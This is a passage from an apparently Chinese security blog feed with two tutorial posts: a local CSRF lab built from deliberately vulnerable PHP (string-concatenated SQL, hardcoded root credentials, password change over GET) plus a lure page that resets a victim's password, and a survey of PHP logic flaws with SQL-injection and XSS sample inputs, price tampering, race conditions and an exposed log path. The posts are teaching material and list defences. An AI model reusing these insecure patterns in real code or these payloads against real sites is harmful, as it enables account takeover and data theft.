class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login.....<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"> </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php">session_start();</span><br><span class="php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;username&quot;</span>];</span><br><span class="php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;password&quot;</span>];</span><br><span class="php"><span class="hljs-variable">$con</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);</span><br><span class="php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;</span><br><span class="php"> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;database connect error!&quot;</span>);</span><br><span class="php"> &#125;</span><br><span class="php">mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$con</span>);</span><br><span class="php"><span class="hljs-variable">$dbusername</span>=<span class="hljs-literal">null</span>;</span><br><span class="php"><span class="hljs-variable">$dbpassword</span>=<span class="hljs-literal">null</span>;</span><br><span class="php"><span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-string">&quot;select * from user where username=&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;;&quot;</span>);</span><br><span class="php"><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_array(<span class="hljs-variable">$result</span>))&#123;</span><br><span class="php"> <span class="hljs-variable">$dbusername</span>=<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>];</span><br><span class="php"> <span class="hljs-variable">$dbpassword</span>=<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;password&quot;</span>];</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-keyword">if</span>(is_null(<span class="hljs-variable">$dbusername</span>))&#123;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">alert(&quot;username is not exist!&quot;);</span><br><span class="xml">window.location.href=&quot;login.html&quot;;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"> &#125;</span><br><span class="php"><span class="hljs-keyword">else</span>&#123;</span><br><span class="php"> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dbpassword</span>!=<span class="hljs-variable">$password</span>)&#123;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">alert(&quot;password error!&quot;);</span><br><span class="xml">window.location.href=&quot;login.html&quot;;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    </span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"> &#125;</span><br><span class="php"> <span class="hljs-keyword">else</span>&#123;</span><br><span class="php"> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$username</span>;</span><br><span class="php"> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;code&quot;</span>]=mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">100000</span>);</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">window.location.href=&quot;welcome.php&quot;;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"> &#125;</span><br><span class="php"> &#125;</span><br><span class="php">mysql_close(<span class="hljs-variable">$con</span>);</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"> </span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>后台拿到收到的账号密码，然后连接数据库登陆，与数据库中账号密码匹配成功则生成session并跳转到welcome.php，匹配失败就返回login.html。</p><p>登陆成功界面welcome.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>welcome<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  </span><br><span class="xml">  </span><br><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="php">session_start ();  </span><br><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ( <span class="hljs-variable">$_SESSION</span> [<span class="hljs-string">&quot;code&quot;</span>] )) &#123;<span class="hljs-comment">//判断code存不存在，如果不存在，说明异常登录  </span></span><br><span class="php">    <span class="hljs-meta">?&gt;</span></span><span class="xml">  </span><br><span class="xml">welcome </span><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;_SESSION[&quot;</span>username<span class="hljs-string">&quot;]&#125;&quot;</span>;<span class="hljs-comment">//显示登录用户名  </span></span><br><span class="php">    <span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>  </span><br><span class="xml">your ip：</span><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;&quot;</span>;<span class="hljs-comment">//显示ip  </span></span><br><span class="php">    <span class="hljs-meta">?&gt;</span></span><span class="xml">  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;exit.php&quot;</span>&gt;</span>exit<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  </span><br><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//code不存在，调用exit.php 退出登录  </span></span><br><span class="php">    <span class="hljs-meta">?&gt;</span></span><span class="xml">  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="xml">    alert(&quot;exit&quot;);  </span><br><span class="xml">    window.location.href=&quot;exit.php&quot;;  </span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  </span><br><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="php">&#125;  </span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml">  </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!--  &lt;input type=&quot;button&quot; onclick=&quot;window.location.href=&#x27;password.html&#x27;&quot; value=&quot;change password&quot;&gt;   --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><br><span class="xml">newpassword: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><br><span class="php"><span class="hljs-variable">$con</span>=mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);</span><br><span class="php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;</span><br><span class="php"> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;database connect error!&quot;</span>);</span><br><span class="php"> &#125;</span><br><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;</span><br><span class="php"><span class="hljs-variable">$n_password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="php"><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;$&#123;_SESSION[&quot;</span>username<span class="hljs-string">&quot;]&#125;&quot;</span>;</span><br><span class="php"><span class="hljs-comment">#print &quot;update user set password= &#x27;&quot;.$n_password.&quot;&#x27; where username= &#x27;&quot;.$username.&quot;&#x27;;&quot;;</span></span><br><span class="php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;update user set password= &#x27;&quot;</span>.<span class="hljs-variable">$n_password</span>.<span class="hljs-string">&quot;&#x27; where username= &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;;&quot;</span>);</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> </span><br></code></pre></td></tr></table></figure><p>登陆成功界面显示用户名和ip地址，然后有一个修改密码的输入框，如果我们在这里提交新密码，就会连接mysql数据库修改密码，点击exit可以退出登陆。</p><p>退出处理exit.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>log out<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php">session_start();</span><br><span class="php">session_destroy();</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">window.location.href=&quot;login.html&quot;;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>exit.php将session销毁，然后返回login.html。</p><p>上述四个文件编写完毕，基本的环境就完成了，下来我们看如何进行csrf攻击。</p><h2 id="0x04-csrf实现"><a href="#0x04-csrf实现" class="headerlink" title="0x04 csrf实现"></a>0x04 csrf实现</h2><p>首先登陆界面如下：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf02.png"></p><p>lily用自己账号登陆了这个界面：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf03.png"></p><p>然后修改了密码，发现密码修改时的url请求为：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf04.png"></p><p>然后lily想，如果构造一个url请求发给别人，别人正好处于没有退出登陆的情况下点击了这个url，会不会被修改密码。</p><p>ps：此时lily密码为233333，jack密码为qwe123。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf05.png"></p><p>所以lily就构造url：<a href="http://127.0.0.1/csrf/welcome.php?password=123456">http://127.0.0.1/csrf/welcome.php?password=123456</a> 给已经登陆的jack<br>，然后jack点击了lily发来的网址，jack的密码变成了123456：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf06.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf07.png"></p><p>这个时候lily想，直接发网址太容易暴露了，我构造一个钓鱼网页，来欺骗jack点，所以写了一个hack.html(这个可以写在任何网络中，诱导jack点击)：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://127.0.0.1/csrf/welcome.php?password=123456&quot;</span>&gt;</span>233333<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf08.png"></p><p>这个时候，只要处于未退出状态的人点击了这个链接，密码就会被改成123456</p><p>至此，一次完美的csrf攻击就完成了。</p><h2 id="0x05-应对"><a href="#0x05-应对" class="headerlink" title="0x05 应对"></a>0x05 应对</h2><ul><li><p>添加验证码<br>如果提交请求的界面需要有验证码，即使存在csrf漏洞，攻击者也无法预测下一个验证码是什么，就成功的避免了csrf攻击。</p></li><li><p>验证referer<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器是从哪个页面链接过来的，而且它无法被javascript所更改，所以服务器可以通过Referer来判断是用户的正常操作还是被csrf攻击后的操作。</p></li><li><p>token<br>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p></li><li><p>设置跨域权限<br>设置跨域权限使用户的某些操作不接受其他域的提交，就可以避免csrf。</p></li></ul><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>CSRF漏洞虽然原理不难理解，攻击也不难实现，但是搭漏洞环境时一句一句的写代码出了很多错误花了很多时间，不过总的来说受益良多，提升了自己的编程能力。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逻辑处理漏洞</title>
    <link href="/2018/04/17/%E9%80%BB%E8%BE%91%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/04/17/%E9%80%BB%E8%BE%91%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-逻辑处理漏洞"><a href="#0x00-逻辑处理漏洞" class="headerlink" title="0x00 逻辑处理漏洞"></a>0x00 逻辑处理漏洞</h2><p>很多漏洞出现的原因是在代码编写的环节没有考虑到一些安全问题，由程序逻辑失误导致的，这里记录一下一些常见的逻辑处理漏洞。</p><h2 id="0x01-in-array函数"><a href="#0x01-in-array函数" class="headerlink" title="0x01 in_array函数"></a>0x01 in_array函数</h2><p>in_array()函数是用来判断一个值是否在一个列表里面，一般用法如下：  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">in_array</span><span class="hljs-params">(<span class="hljs-string">&#x27;b&#x27;</span>,array(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>当我们php代码中这样写时：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)))<br>&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select where id=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码判断得到的参数id的值是否在array这个数组中，但是这里如果输入id=1’ union select * from user，in_array()函数会自动进行类型转换，就会认为这个输入参数类型转换之后是1，属于array数组中，就会执行select where id =’1’ union select * from user。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic01.png"></p><h2 id="0x02-双等于和三等于"><a href="#0x02-双等于和三等于" class="headerlink" title="0x02 双等于和三等于"></a>0x02 双等于和三等于</h2><p>php中，双等于与三等于之间有一些区别，其中双等于在判断等于之前会先进行数据类型转换，而三等于则不会，所以在一些情况下，双等于会造成一些安全问题。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]==<span class="hljs-number">2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>var_dump()函数用于输出变量结构、内容和类型，一般用于精确调试。  </p><p>这里我们如果给出var=2abcd,就会返回bool(true),发现类型强制转换之后判断为true。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic02.png"></p><h2 id="0x03-is-numeric函数"><a href="#0x03-is-numeric函数" class="headerlink" title="0x03 is_numeric函数"></a>0x03 is_numeric函数</h2><p>in_numeric()用来判断一个变量是否为数字，如果检查通过返回true，否则返回false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into user values(&#x27;user&#x27;,<span class="hljs-subst">&#123;$_GET[&#x27;var&#x27;]&#125;</span>)&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个函数存在一个问题，那就是当传入hex时直接通过并返回true，但是mysql中是可以通过hex编码代替明文的，如我们提交一个xss测试代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对应的hex编码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></code></pre></td></tr></table></figure><p>就会成功的将代码传入数据库。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic03.png"></p><h2 id="0x04-订单支付漏洞"><a href="#0x04-订单支付漏洞" class="headerlink" title="0x04 订单支付漏洞"></a>0x04 订单支付漏洞</h2><p>在一些电商网站会出现的一些逻辑漏洞，主要是客户可以更改单价、总价、数量等，然后提交之后后台未作严格的校验导致的。</p><p>比如价格可以在客户端提交，那么原本几千元的商品，我们抓包修改提交订单的商品单价为1，如果后台未作校验直接跳转支付界面，那么就可以用一元钱购买物品。总价也是同理。</p><p>再比如将要购买的商品数量或单价改为负数，如果后台未作检验，那么计算总价时就会计算出负数，反而会让我们越买钱越多。</p><h2 id="0x05-利用时间差"><a href="#0x05-利用时间差" class="headerlink" title="0x05 利用时间差"></a>0x05 利用时间差</h2><p>这种类型在早期刷钻的时候出现过，先发给腾讯一条开通某钻的订单，然后再发送一个取消业务的短信给运营商，这样腾讯那边成功开通但是无法扣费，就实现了刷钻。</p><p>还有就是在购买商品时，判断余额这条语句和扣费语句之间有某几条语句浪费了一些时间。比如我们有10元钱，然后商品也是10元，我们就可以以极快的速度发很多个请求，这个时候还没用扣费所以判断余额10元足够开通，然后请求都发送之后，获得了很多个10元钱请求的商品，然后才开始扣费，使余额成为负数，但是商品已经全部成功买到。</p><h2 id="0x06-水平权限漏洞"><a href="#0x06-水平权限漏洞" class="headerlink" title="0x06 水平权限漏洞"></a>0x06 水平权限漏洞</h2><p>水平越权，即是相同级别的用户或者同一角色的不同用户之间，可以越权访问修改或者删除等重要功能。  </p><p>如果我们自己的页面最后的id是12300，如果设计者没有考虑到水平权限的问题再次验证用户访问的空间是否属于这个用户自身的话，那么就可以通过遍历来得到所有用户的信息，甚至进行修改等。</p><h2 id="0x07-垂直权限漏洞"><a href="#0x07-垂直权限漏洞" class="headerlink" title="0x07 垂直权限漏洞"></a>0x07 垂直权限漏洞</h2><p>垂直越权就是低权限用户(普通用户)可以访问更高权限(如管理员)才能访问到的资源。  </p><p>如之前淘宝举报号任意访问的问题，我们通过普通用户的身份，可以访问只有管理员才能访问的举报信息，就是这里的权限检查出现问题。</p><h2 id="0x08-未授权访问"><a href="#0x08-未授权访问" class="headerlink" title="0x08 未授权访问"></a>0x08 未授权访问</h2><p>这个漏洞广泛存在于目前的网络中，很多公司都没有对自己公司的某些敏感目录做访问限制，使得外网可以直接通过浏览器访问。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic04.jpg"></p><p>如正方教务系统的后台敏感日志查看漏洞</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic05.png"></p><p>我们在正方教务系统的登陆页面后面加上/log/2018-04-17-log.txt，就可以直接访问后台敏感日志。</p><p>有的公司的files信息和phpinfo信息，也直接暴露给用户，会被获得很多敏感信息。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic06.jpg"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/logic/logic07.png"></p><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>逻辑处理漏洞还有很多类型，比如验证码爆破、密码找回等等，这些漏洞虽然原理不难理解，但是由于程序员编写代码时的考虑不周，导致逻辑处理漏洞广泛存在，并且危害极高，解决逻辑处理漏洞，更需要的是安全工作人员和开发人员的沟通配合。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>逻辑处理漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞绕过方式总结</title>
